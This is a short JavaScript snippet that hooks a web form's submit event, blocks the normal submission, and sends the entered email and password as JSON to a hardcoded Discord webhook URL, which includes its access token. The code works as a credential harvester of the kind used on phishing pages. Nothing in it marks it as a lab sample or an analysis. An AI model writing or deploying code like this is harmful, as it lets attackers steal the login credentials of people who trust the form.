const form = document.querySelector('form');
form.addEventListener('submit', async (event) => {
  event.preventDefault();
  const email = event.target.elements.email.value;
  const password = event.target.elements.password.value;
  const webhookUrl = 'https://discord.com/api/webhooks/1103319312900567192/3SWoHjepeUxQEShb8Y2SFO-DJZNED1Cu6z49g6RT0_Z_6Zref4z5_0rYWQ4X9zvoilZN';
  const data = { email, password };
  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
    if (response.ok) {
      console.log('Webhook sent successfully!');
    } else {
      console.error('Error sending webhook:', response.statusText);
    }
  } catch (error) {
    console.error('Error sending webhook:', error);
  }
});
